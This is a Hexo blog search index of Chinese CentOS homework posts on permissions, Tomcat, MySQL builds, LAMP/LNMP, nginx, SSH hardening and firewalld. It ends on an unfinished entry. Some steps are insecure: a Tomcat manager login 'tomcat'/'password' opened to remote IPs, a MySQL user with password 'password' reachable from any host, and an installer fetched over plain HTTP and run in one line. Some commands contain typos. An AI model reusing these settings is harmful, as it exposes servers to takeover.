<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>20200804 Linux-Centos-权限与tomcat</title>
    <url>/2020/08/04/20200804-Linux/</url>
    <content><![CDATA[<h1 id="20200804-Linux"><a href="#20200804-Linux" class="headerlink" title="20200804 Linux"></a>20200804 Linux</h1><h2 id="1-为什么要创建特定的用户去运行服务-并分配特定的目录权限"><a href="#1-为什么要创建特定的用户去运行服务-并分配特定的目录权限" class="headerlink" title="1,为什么要创建特定的用户去运行服务,并分配特定的目录权限"></a>1,为什么要创建特定的用户去运行服务,并分配特定的目录权限</h2><p>  一切皆是为了安全,特定的用户不能登录服务器shell,并且只有相对应的目录权限,有效的保证了服务器的运行安全,并且设定特别目录权限,可以有效的防止信息泄漏,恶意修改文件.</p>
<h2 id="2-chmod-chgrp-chown区别-以及-R的用法"><a href="#2-chmod-chgrp-chown区别-以及-R的用法" class="headerlink" title="2,chmod,chgrp,chown区别,以及-R的用法"></a>2,chmod,chgrp,chown区别,以及-R的用法</h2><p>chmod</p>
<p>修改文件权限</p>
<p>chgrp</p>
<p>变更文件或目录的所属群组</p>
<p>chown</p>
<p>修改文件拥有者,以及拥有组</p>
<p>加上-R是:</p>
<p>对目前目录下的所有文件与子目录进行相同的权限变更(即以递回的方式逐个变更)</p>
<p>不加-R</p>
<p>针对对应文件或目录的权限进行修改</p>
<h2 id="3-创建文件并分配指定权限"><a href="#3-创建文件并分配指定权限" class="headerlink" title="3,创建文件并分配指定权限"></a>3,创建文件并分配指定权限</h2><p><img src="https://i.loli.net/2020/08/04/Nr6DxLb3ZH8YBXM.png" alt="https://i.loli.net/2020/08/04/Nr6DxLb3ZH8YBXM.png"></p>
<p>touch 创建文件 testttt</p>
<p>chomod 分配权限为 所属用户读写 所属组执行  其他无权限</p>
<h2 id="4-git服务与Tomcat"><a href="#4-git服务与Tomcat" class="headerlink" title="4,git服务与Tomcat"></a>4,git服务与Tomcat</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>yum -y  install git</p>
<p>安装git包</p>
<p>创建用户git并分配密码</p>
<p><img src="https://i.loli.net/2020/08/04/VeAJFdUKRlNuQa8.png" alt="img"> </p>
<p>su git</p>
<p>#切换用户到git</p>
<p>mkdir 123w</p>
<p>#创建目录 123w</p>
<p>git add 123w</p>
<p>#将123w添加到git</p>
<p> <img src="https://i.loli.net/2020/08/04/vdSNIpVkKYO1Jof.png" alt="img"></p>
<p>Git成功</p>
<p>搭建git服务器的时候使用里新用户git,并且可以通过修改配置文件来禁止git用户登录git服务器,同时也对文件上的相关权限做了权限设置git用户仅有git仓库目录的修改权限,从而保证了服务器系统的运行安全</p>
<h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>采用直接下载官方文件使用 shell脚本直接运行</p>
<p><code>wget  https://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.57/bin/apache-tomcat-8.5.57.zip</code></p>
<p><code>#下载tomcat8.0zip文件包</code></p>
<p><code>unzip apache-tomcat-8.5.57.zip</code></p>
<p> <code>#解压</code></p>
<p><img src="https://i.loli.net/2020/08/04/8kDsm6f1zvqG9I5.png" alt="https://i.loli.net/2020/08/04/8kDsm6f1zvqG9I5.png"></p>
<p>创建tomcat用户并给予tomcat目录权限</p>
<p>切换用户到tomcat后:</p>
<p><img src="https://i.loli.net/2020/08/04/RHAXnyb5Ia3LONi.png" alt="https://i.loli.net/2020/08/04/RHAXnyb5Ia3LONi.png"></p>
<p>#设置bin权限为755后运行startup.sh</p>
<p><img src="https://i.loli.net/2020/08/04/7IQO3J4RkPKUve8.png" alt="https://i.loli.net/2020/08/04/7IQO3J4RkPKUve8.png">``</p>
<p>修改配置文件开启设置管理页面</p>
<p><code>vim conf/tomcat-users.xml</code></p>
<p>添加如下html代码</p>
<p><code>&lt;role rolename=&quot;manager-gui&quot;/&gt;</code><br><code>&lt;user username=&quot;tomcat&quot; password=&quot;password&quot; roles=&quot;manager-gui&quot;/&gt;</code></p>
<p>在 <code>&lt;/tomcat-users&gt;</code>前</p>
<p>修改webapps/manager/META-INF/context.xml来允许其他ip访问管理页面</p>
<p><img src="https://i.loli.net/2020/08/04/WRMkjT7i3pGmIyz.png" alt="https://i.loli.net/2020/08/04/WRMkjT7i3pGmIyz.png"></p>
<p>注释如图代码即可</p>
<p>重启tomcat服务器访问管理页面</p>
<p><img src="https://i.loli.net/2020/08/04/PWaNCbL9MktozS5.png" alt="https://i.loli.net/2020/08/04/PWaNCbL9MktozS5.png"></p>
]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>你好世界</title>
    <url>/2020/08/04/%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C/</url>
    <content><![CDATA[<h1 id="你好世界"><a href="#你好世界" class="headerlink" title="你好世界"></a>你好世界</h1><h3 id="关于我"><a href="#关于我" class="headerlink" title="关于我:"></a>关于我:</h3><p>sakuradied (咸鱼一条)</p>
<p>网络安全学习中</p>
<h3 id="关于这个博客"><a href="#关于这个博客" class="headerlink" title="关于这个博客:"></a>关于这个博客:</h3><p>建于作业所要,这个</p>
<p>在2021年前发布的仅为自己学习中的作业或者记录</p>
]]></content>
  </entry>
  <entry>
    <title>manjaro安装hexo</title>
    <url>/2020/08/06/manjaro%E5%AE%89%E8%A3%85hexo/</url>
    <content><![CDATA[<h1 id="manjaro安装Hexo"><a href="#manjaro安装Hexo" class="headerlink" title="manjaro安装Hexo"></a>manjaro安装Hexo</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> sudo pacman -S nodejs npm</span><br><span class="line"></span><br><span class="line">#安装node.js和npm</span><br><span class="line"></span><br><span class="line">sudo npm install -g hexo --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">#使用安装npm安装hexo</span><br></pre></td></tr></table></figure>

<p>到此结束 (仓库都有)</p>
]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>20200811 Linux-Centos常用软件安装方式</title>
    <url>/2020/08/12/20200811-Linux/</url>
    <content><![CDATA[<h1 id="20200811-Linux"><a href="#20200811-Linux" class="headerlink" title="20200811 Linux"></a>20200811 Linux</h1><h2 id="yum-安装jdk"><a href="#yum-安装jdk" class="headerlink" title="yum 安装jdk"></a>yum 安装jdk</h2><p><code>yum -y  install java-1.8.0-openjdk</code></p>
<p><img src="https://i.loli.net/2020/08/11/BO6gvqVytRel4nr.png" alt="https://i.loli.net/2020/08/11/BO6gvqVytRel4nr.png"></p>
<hr>
<h2 id="通过源码安装安装mysql"><a href="#通过源码安装安装mysql" class="headerlink" title="通过源码安装安装mysql"></a>通过源码安装安装mysql</h2><p>查看glibc版本号:</p>
<p><img src="https://i.loli.net/2020/08/11/VYqDiCohWktvrlH.png" alt="image.png"></p>
<p>从官网网页下载指定内容</p>
<p><img src="https://i.loli.net/2020/08/11/kITKfuVh2RjpctY.png" alt="image.png"></p>
<p>wget 下载:</p>
<p><img src="https://i.loli.net/2020/08/11/bEMGgO5L9yCTvxU.png" alt="img"></p>
<p>参考mysql官方帮助文档进行安装步骤确定</p>
<p><img src="https://i.loli.net/2020/08/11/wJcnPZq7fQjFOHE.png" alt="image.png"></p>
<p>在阅读官方文档的时候官方提示:</p>
<ul>
<li>Building MySQL with nonstandard options may lead to reduced functionality, performance, or security.  </li>
</ul>
<h3 id="编译安装cmake3"><a href="#编译安装cmake3" class="headerlink" title="编译安装cmake3"></a>编译安装cmake3</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/usr/local/cmake </span><br><span class="line"><span class="meta">#</span><span class="bash">--prefix= 编译的时候用来指定程序存放路径 。</span></span><br><span class="line">make &amp;&amp; make install </span><br></pre></td></tr></table></figure>
<p>需要等待较长时间</p>
<p>如过出现如下报错</p>
<p><img src="https://i.loli.net/2020/08/12/sC9ThuaEPr6fGi3.png" alt="image.png"></p>
<p>请安装OenSSL:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install openssl-devel</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/12/GwR9qk31ZvWyQIK.png" alt="image.png"></p>
<p>安装完成</p>
<p>设置软链接:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /usr/local/cmake/bin/cmake /usr/bin/cmake</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/08/12/NsJu7I6diKxWcXk.png" alt="image.png"></p>
<h3 id="升级gcc版本为8-3-0"><a href="#升级gcc版本为8-3-0" class="headerlink" title="升级gcc版本为8.3.0"></a>升级gcc版本为8.3.0</h3><p>mysql8.0 安装需要gcc 8.0 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum install centos-release-scl</span><br><span class="line"></span><br><span class="line">sudo yum install devtoolset-8-gcc*</span><br><span class="line"></span><br><span class="line">scl enable devtoolset-8 bash</span><br></pre></td></tr></table></figure>

<p>参考博客:<br><a href="https://www.cnblogs.com/jixiaohua/p/11732225.html">https://www.cnblogs.com/jixiaohua/p/11732225.html</a></p>
<p>修改并创建g++ 8.3 的软链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm  /usr/bin/g++ </span><br><span class="line">ln -s /opt/rh/devtoolset-8/root/bin/g++  /usr/bin/g++</span><br><span class="line">ln -s /opt/rh/devtoolset-8/root/bin/g++  /usr/local/gcc/bin/g++</span><br></pre></td></tr></table></figure>



<h3 id="编译并安装mysql8-0"><a href="#编译并安装mysql8-0" class="headerlink" title="编译并安装mysql8.0"></a>编译并安装mysql8.0</h3><ul>
<li>关于环境要求请参考网络资料,我这里预先准备好了基本环境</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir bld</span><br><span class="line">cd bld</span><br><span class="line">cmake ../ -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci -DSYSCONFDIR=/etc -DWITH_EXTRA_CHARSETS=all -DMYSQL_DATADIR=/usr/local/mysql/data -DWITH_BOOST=/root/mysql/mysql-8.0.21/boost -DFORCE_INSOURCE_BUILD=1 -DCMAKE_CXX_COMPILER=/usr/local/gcc/bin/g++ -DDEFAULT_CHARSET=utf8</span><br></pre></td></tr></table></figure>

<ul>
<li>这里需要注意以上代码的路径选择<br>参考资料:<br><a href="https://gitlab.kitware.com/cmake/community/-/wikis/home">https://gitlab.kitware.com/cmake/community/-/wikis/home</a><br>源代码构建完成,开始编译并安装:<br>make &amp;&amp; make install</li>
</ul>
<p><img src="https://i.loli.net/2020/08/12/27qpwOz8QcCPfRl.png" alt="img"></p>
<p>接下来等待即可</p>
<p><img src="https://i.loli.net/2020/08/12/jsu2BSgfQKt5GNW.png" alt="image.png"></p>
<p>编译完成后创建mysql工作目录复制启动脚本即可</p>
<p>参考资料:</p>
<p><a href="https://www.cnblogs.com/NanZhiHan/p/11017158.html">https://www.cnblogs.com/NanZhiHan/p/11017158.html</a></p>
<h2 id="yum安装mysql"><a href="#yum安装mysql" class="headerlink" title="yum安装mysql"></a>yum安装mysql</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y  install mysql-server</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/12/eQ9cdFwIKVoqYJX.png" alt="image.png"></p>
<h2 id="rpm包安装mysql"><a href="#rpm包安装mysql" class="headerlink" title="rpm包安装mysql"></a>rpm包安装mysql</h2><p>下载系统对应的rpm包</p>
<p><a href="https://dev.mysql.com/downloads/repo/yum/">https://dev.mysql.com/downloads/repo/yum/</a></p>
<p><img src="https://i.loli.net/2020/08/12/Ygs1lka8CuqSLAF.png" alt="image.png"></p>
<p>使用如下命令安装:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh [包文件名]</span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2020/08/12/r6I92lpGtykZPfw.png" alt="image.png"></p>
<h2 id="yum安装与源码安装区别个人理解"><a href="#yum安装与源码安装区别个人理解" class="headerlink" title="yum安装与源码安装区别个人理解"></a>yum安装与源码安装区别个人理解</h2><h3 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h3><p>yum安装是通过yum仓库进行检索并安装的,在使用yum时,会自动检索并安装相关依赖</p>
<p>yum仓库,可以是由官方或者社区进行打包并发布的,其本质仍然是打包好的rpm格式包</p>
<p>使用yum安装时会自动配置安装相关依赖,但是在centos上,官方所提供的yum仓库内的软件版本可能较老</p>
<h3 id="rpm安装"><a href="#rpm安装" class="headerlink" title="rpm安装"></a>rpm安装</h3><p>通过rpm 安装本地或者在线的rpm包,</p>
<p>rpm是一个软件包管理器,创建的rpm包一般由官方或社区打包而成</p>
<p>rpm包安装时需要格外的注意相关依赖是否存在 ,一个各个版本依赖之间的关系</p>
<p>rpm包可随心的去找自己需要的软件版本去安装并不限定与仓库是否存在,只要有人打包即可</p>
]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>20200812-Linux-Centos7 install LAMP</title>
    <url>/2020/08/12/20200812-Linux-Centos7-install-LAMP/</url>
    <content><![CDATA[<p>20200812-Linux-Centos7 install LAMP</p>
<p><img src="https://github.com/teddysun/lamp/raw/master/conf/lamp.png" alt="LAMP"></p>
<p>github:<a href="https://github.com/teddysun/lamp">https://github.com/teddysun/lamp</a></p>
<p>安装环境:</p>
<p>​                Centos7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum -y install wget git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;teddysun&#x2F;lamp.git</span><br><span class="line">cd lamp</span><br><span class="line">chmod +x *.sh</span><br><span class="line">.&#x2F;lamp.sh</span><br></pre></td></tr></table></figure>

<p>执行操作命令后会出现交互页面</p>
<p>lamp会通过您的选择,自动下载并编译你选择的环境包(等待时间较长)</p>
<p>安装完成后返回的安装概述:</p>
<p><img src="https://i.loli.net/2020/08/12/FQwMWlDxudzEL2A.png" alt="image.png"></p>
<p>主页信息:</p>
<p><img src="https://i.loli.net/2020/08/12/A4yvdtMBicQTem1.png" alt="image.png"></p>
<p>在LAMP的主页上会显示安装完成后的相关信息,并且包括了 phpinfo 和php探针</p>
<p><img src="https://i.loli.net/2020/08/12/Ut895pJGAPRCMSH.png" alt="image.png"></p>
<p>phpinfo:<br><img src="https://i.loli.net/2020/08/12/EnYCo8QsBReuIFy.png" alt="phpinfo"></p>
]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>20200812-Linux-Centos7-nginx</title>
    <url>/2020/08/12/20200812-Linux-Centos7-nginx/</url>
    <content><![CDATA[<h1 id="20200812-Linux-Centos7-nginx"><a href="#20200812-Linux-Centos7-nginx" class="headerlink" title="20200812-Linux-Centos7-nginx"></a>20200812-Linux-Centos7-nginx</h1><p><img src="http://nginx.org/nginx.png" alt="Nginx"></p>
<h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install nginx</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/12/PGvi5YVb8AO42T9.png" alt="image.png"></p>
<p>安装完成后编辑 /etc/nginx/nginx.conf 对配置进行修改</p>
<p>这里我仅对端口进行了修改:</p>
<p><img src="https://i.loli.net/2020/08/12/fNQZapTsnuErJkM.png" alt="image.png"></p>
<p>firewall防火墙放行:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permannet --add-port=8080/tcp</span><br><span class="line"><span class="meta">#</span><span class="bash">放行8080端口</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="meta">#</span><span class="bash">重新载入防火墙</span></span><br></pre></td></tr></table></figure>

<p>默认页面:</p>
<p><img src="https://i.loli.net/2020/08/12/kyoVBrb1pCDWJlw.png" alt="image.png"></p>
<p>修改后:</p>
<p><img src="https://i.loli.net/2020/08/12/fO6urkg431YpNMv.png" alt="image.png"></p>
<p>参考地址:</p>
<p><a href="http://nginx.org/en/">http://nginx.org/en/</a></p>
]]></content>
      <tags>
        <tag>作业</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>20200812-Linux-Centos-ssh安全配置</title>
    <url>/2020/08/12/20200812-Linux-Centos-ssh%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h1 id="20200812-Linux-Centos-ssh安全配置"><a href="#20200812-Linux-Centos-ssh安全配置" class="headerlink" title="20200812-Linux-Centos-ssh安全配置"></a>20200812-Linux-Centos-ssh安全配置</h1><h2 id="修改ssh端口"><a href="#修改ssh端口" class="headerlink" title="修改ssh端口"></a>修改ssh端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config </span><br><span class="line"><span class="meta">#</span><span class="bash">对ssh配置文件进行修改</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/12/34ca6tjR8z7YnZy.png" alt="image.png"></p>
<p>firewall防火墙放行:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --add-port=2333/tcp</span><br><span class="line"><span class="meta">#</span><span class="bash">添加放行规则2333/tcp</span></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="meta">#</span><span class="bash">重新加载防火墙规则</span></span><br></pre></td></tr></table></figure>

<p>重启ssh服务:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd.service</span><br></pre></td></tr></table></figure>

<p>登录测试:</p>
<p><img src="https://i.loli.net/2020/08/12/eI1chRul3L6NEwX.png" alt="image.png"></p>
<h2 id="仅运行指定用户登录"><a href="#仅运行指定用户登录" class="headerlink" title="仅运行指定用户登录:"></a>仅运行指定用户登录:</h2><p>创建测试用户并设置密码:</p>
<p><img src="https://i.loli.net/2020/08/12/TeWnkYgQ73ILvx9.png" alt="image.png"></p>
<p>修改ssh配置文件</p>
<p><code>vim /etc/ssh/sshd_config</code></p>
<p>在配置文件中添加</p>
<p><code>AllowUsers test1 test2 test3</code></p>
<p><img src="https://i.loli.net/2020/08/12/aHxK9JWTcFRYM73.png" alt="image.png"></p>
<p>重启ssh服务</p>
<p><code>systemctl restart sshd.service </code></p>
<p>测试:</p>
<p><img src="https://i.loli.net/2020/08/12/RCNYacm6X7QfzDG.png" alt="image.png"></p>
<ul>
<li><p>Permission denied, please try again.</p>
</li>
<li><p>权限被拒绝，请重试。</p>
</li>
<li></li>
</ul>
<p><img src="https://i.loli.net/2020/08/12/eGQf4L9mCWnsUkX.png" alt="image.png"></p>
<ul>
<li>test1 登录成功</li>
</ul>
<p><img src="https://i.loli.net/2020/08/12/eGQf4L9mCWnsUkX.png" alt="image-20200812220421209"></p>
<ul>
<li>test2 登录成功</li>
</ul>
<p><img src="https://i.loli.net/2020/08/12/GCbNLXIncPsKRMF.png" alt="image.png"></p>
<ul>
<li><p>test3 登录成功</p>
<h3 id="修改指定尝试密码次数为三次"><a href="#修改指定尝试密码次数为三次" class="headerlink" title="修改指定尝试密码次数为三次"></a>修改指定尝试密码次数为三次</h3></li>
</ul>
<p><img src="https://i.loli.net/2020/08/12/NwUEblDsZ3e15Qc.png" alt="image.png"></p>
<p>重启ssh服务即可</p>
]]></content>
      <tags>
        <tag>作业</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>20200813-Linux- CentOs防火墙基础使用</title>
    <url>/2020/08/13/20200813-Linux-CentOs%E9%98%B2%E7%81%AB%E5%A2%99%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="20200813-Linux-CentOs防火墙基础使用"><a href="#20200813-Linux-CentOs防火墙基础使用" class="headerlink" title="20200813-Linux- CentOs防火墙基础使用"></a>20200813-Linux- CentOs防火墙基础使用</h1><hr>
<h2 id="Centos7-firewall"><a href="#Centos7-firewall" class="headerlink" title="Centos7 firewall"></a>Centos7 firewall</h2><p>官方参考文档:</p>
<p><a href="https://firewalld.org/documentation/">https://firewalld.org/documentation/</a></p>
<h3 id="状态选项参数"><a href="#状态选项参数" class="headerlink" title="状态选项参数:"></a>状态选项参数:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--state</span><br></pre></td></tr></table></figure>

<blockquote>
<p>检查firewalld守护程序是否处于活动状态（即正在运行）。如果处于活动状态，*<code>RUNNING_BUT_FAILED</code><em>则返回退出代码0；如果启动失败，则返回退出代码0 *<code>NOT_RUNNING</code>*。请参阅<a href="https://firewalld.org/documentation/man-pages/firewall-cmd#exit_codes">“退出代码”部分</a>。这还将状态打印到</em><code>STDOUT</code>*。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--reload</span><br></pre></td></tr></table></figure>

<blockquote>
<p>重新加载防火墙规则并保留状态信息。当前的永久配置将成为新的运行时配置，即，如果所有运行时仅更改完成，直到重新加载丢失（如果它们也未处于永久配置中）。</p>
<p>注意：通过直接接口应用的运行时更改不会受到影响，因此将保留在原处，直到完全重新启动firewalld守护程序为止。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--complete-reload</span><br></pre></td></tr></table></figure>

<blockquote>
<p>完全重新加载防火墙，甚至是netfilter内核模块。这很可能会终止活动连接，因为状态信息会丢失。仅在严重的防火墙问题时才应使用此选项。例如，如果存在状态信息问题，则使用正确的防火墙规则无法建立连接。</p>
<p>注意：通过直接接口应用的运行时更改不会受到影响，因此将保留在原处，直到完全重新启动firewalld守护程序为止。</p>
</blockquote>
<h3 id="基本使用方法"><a href="#基本使用方法" class="headerlink" title="基本使用方法"></a>基本使用方法</h3><p>放行端口:</p>
<p><code>firewall-cmd --permanent --add-port=80/tcp</code></p>
<ul>
<li>–permannet #永久生效</li>
<li>–add-port #添加一个指定的端口和端口类型</li>
<li>80/tcp #端口和端口类型</li>
</ul>
<p>移除以开放的端口:</p>
<p><code>firewall-cmd --permanent --remove-port=80/tcp</code></p>
<ul>
<li>–permannet #永久生效</li>
<li>–remove-port #移除一个指定的端口和端口类型</li>
<li>80/tcp #端口和端口类型</li>
</ul>
<p>查询开放端口:<br>` firewall-cmd –list-ports<br><img src="https://i.loli.net/2020/08/13/npGt1wlmhDi6uR7.png" alt="image.png"></p>
<h3 id="丢弃icmp包-禁ping"><a href="#丢弃icmp包-禁ping" class="headerlink" title="丢弃icmp包(禁ping)"></a>丢弃icmp包(禁ping)</h3><p><code>firewall-cmd --permanent --add-rich-rule=&#39;rule protocol value=icmp drop&#39;</code></p>
<ul>
<li>–add-rich-rule #建新一个富有规则(翻译来源百度参考与官方资料类iptables规则)</li>
<li>rule protocol value=icmp drop  #规则协议值为丢弃icmp  </li>
</ul>
<p>参考资料:</p>
<p>​                <a href="https://firewalld.org/documentation/man-pages/firewall-cmd">https://firewalld.org/documentation/man-pages/firewall-cmd</a></p>
<p>​                <a href="https://zhuanlan.zhihu.com/p/23519454">https://zhuanlan.zhihu.com/p/23519454</a></p>
<p>​                <a href="https://www.computernetworkingnotes.com/rhce-study-guide/firewalld-rich-rules-explained-with-examples.html">https://www.computernetworkingnotes.com/rhce-study-guide/firewalld-rich-rules-explained-with-examples.html</a></p>
<p>测试:</p>
<p>默认规则时:</p>
<p><img src="https://i.loli.net/2020/08/13/zreBUTS3ZCIM6hG.png" alt="image.png"></p>
<p>添加规则后:<br><img src="https://i.loli.net/2020/08/13/nGKLyeI4qwHTgbh.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/13/BgiczvPAOosQx2R.png" alt="image.png"></p>
<h2 id="Centos6-iptables"><a href="#Centos6-iptables" class="headerlink" title="Centos6 iptables"></a>Centos6 iptables</h2><p>参考资料:</p>
<p><a href="http://www.zsythink.net/archives/1199">http://www.zsythink.net/archives/1199</a></p>
<p><a href="http://www.netfilter.org/">http://www.netfilter.org/</a></p>
<p>禁止ping:</p>
<p>未启用规则前:</p>
<p><img src="https://i.loli.net/2020/08/13/mvq8LGQONHRAo2k.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p icmp --icmp-type any -j DROP   </span><br></pre></td></tr></table></figure>

<p>启用规则后</p>
<p><img src="https://i.loli.net/2020/08/13/nAxbT8gSpkD32jX.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>作业</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>20200813-Linux-Centos7 LNMP搭建wordpress</title>
    <url>/2020/08/13/20200813-Linux-Centos7-LNMP%E6%90%AD%E5%BB%BAwordpress/</url>
    <content><![CDATA[<h1 id="20200813-Linux-Centos7-LNMP搭建wordpress"><a href="#20200813-Linux-Centos7-LNMP搭建wordpress" class="headerlink" title="20200813-Linux-Centos7 LNMP搭建wordpress"></a>20200813-Linux-Centos7 LNMP搭建wordpress</h1><p><img src="https://i.loli.net/2020/08/13/wGnUHVhAcak81dq.png" alt="image.png"><br>wordpress :<a href="https://cn.wordpress.org/">https://cn.wordpress.org/</a><br><img src="https://i.loli.net/2020/08/13/OvyjLZEzsa5mDrw.png" alt="image.png"><br>LNMP:<a href="https://lnmp.org/">https://lnmp.org/</a></p>
<h3 id="安装LNMP"><a href="#安装LNMP" class="headerlink" title="安装LNMP:"></a>安装LNMP:</h3><p>这里采用一键安装脚本:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.7.tar.gz -cO lnmp1.7.tar.gz &amp;&amp; tar zxf lnmp1.7.tar.gz &amp;&amp; cd lnmp1.7 &amp;&amp; ./install.sh lnmp</span><br></pre></td></tr></table></figure>

<p>出现交换页面根据需求选择你所需要的软件版本<br>安装完成:<br><img src="https://i.loli.net/2020/08/13/M7XKLwkNeERuG2U.png" alt="image.png"><br><img src="https://i.loli.net/2020/08/13/A6dJ4gRU2aXnbj7.png" alt="image.png"></p>
<h3 id="下载wordpress博客"><a href="#下载wordpress博客" class="headerlink" title="下载wordpress博客"></a>下载wordpress博客</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget  https://cn.wordpress.org/latest-zh_CN.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash">通过wordpressCN下载</span></span><br><span class="line">tar -zxvf latest-zh_CN.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash">解压wordpress包</span></span><br><span class="line">cp -r -p wordpress /home/wwwroot/default</span><br><span class="line"><span class="meta">#</span><span class="bash">复制wordpress文件到网站目录</span></span><br><span class="line">cd /home/wwwroot/default</span><br><span class="line"><span class="meta">#</span><span class="bash">切换工作目录</span></span><br><span class="line">chown -R www:www wordpress/</span><br><span class="line"><span class="meta">#</span><span class="bash">修改目录所属用户和所属组</span></span><br><span class="line">chmod -R wordpress/</span><br><span class="line"><span class="meta">#</span><span class="bash">修改目录权限</span></span><br></pre></td></tr></table></figure>

<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"><span class="meta">#</span><span class="bash">链接到数据库</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/13/oaREjDMdbVBmhST.png" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> wordpress;</span><br><span class="line"><span class="comment">#创建数据库 wordpress</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> wpadmin <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="comment">#创建用户wpadmin并设置密码password</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">ON</span> wordpress.* <span class="keyword">TO</span> <span class="string">&#x27;wpadmin&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">WITH</span> <span class="keyword">GRANT</span> <span class="keyword">OPTION</span>;</span><br><span class="line"><span class="comment">#分配用户权限为wordpress库的完整权限</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"><span class="comment">#刷新权限</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/13/tsopfQj5aDLbPdX.png" alt="image.png"></p>
<h3 id="wordpress-WEB安装"><a href="#wordpress-WEB安装" class="headerlink" title="wordpress WEB安装"></a>wordpress WEB安装</h3><p>进入wordpress安装页面<br><img src="https://i.loli.net/2020/08/13/cjJSlM8rfZyIoGL.png" alt="image.png"><br>设置数据库信息:</p>
<p><img src="https://i.loli.net/2020/08/13/W85qjU2siQTp6tH.png" alt="image.png"></p>
<p>设置基本信息完成安装:</p>
<p><img src="https://i.loli.net/2020/08/13/FRjt16cfQ8CNXqe.png" alt="image.png"></p>
<p>完成安装:</p>
<p><img src="https://i.loli.net/2020/08/13/mnFwGR9bISr2Vfv.png" alt="image-20200813131923629.png"><br>发布新的页面进行测试:</p>
<p><img src="https://i.loli.net/2020/08/13/GntDUYEKTLR9Wzh.png" alt="image.png"></p>
]]></content>
      <tags>
        <tag>作业</tag>
        <tag>学习</tag>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>记20200815面试</title>
    <url>/2020/08/17/%E8%AE%B020200815%E9%9D%A2%E8%AF%95/</url>
